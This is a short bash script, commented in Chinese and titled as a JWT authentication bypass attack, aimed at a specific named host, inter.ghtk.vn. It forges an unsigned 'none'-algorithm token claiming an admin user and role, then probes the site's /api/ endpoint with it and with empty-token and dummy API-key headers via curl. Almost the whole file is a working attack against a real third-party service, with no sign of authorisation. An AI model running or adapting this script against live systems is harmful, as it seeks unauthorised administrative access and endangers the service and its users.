#!/bin/bash
# JWT认证绕过攻击脚本

TARGET="https://inter.ghtk.vn"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔐 JWT认证绕过测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 测试1：None算法攻击
echo -e "\n[测试1] JWT None算法攻击"
NONE_TOKEN=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"user":"admin","role":"admin"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
JWT_NONE="${NONE_TOKEN}.${PAYLOAD}."

curl -sk "$TARGET/api/" -H "Authorization: Bearer $JWT_NONE" -I | grep -E "HTTP|www-authenticate"

# 测试2：空JWT
echo -e "\n[测试2] 空JWT"
curl -sk "$TARGET/api/" -H "Authorization: Bearer null" -I | grep -E "HTTP|www-authenticate"

# 测试3：无Authorization
echo -e "\n[测试3] X-API-Key尝试"
curl -sk "$TARGET/api/" -H "X-API-Key: test" -I | grep -E "HTTP|www-authenticate"

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
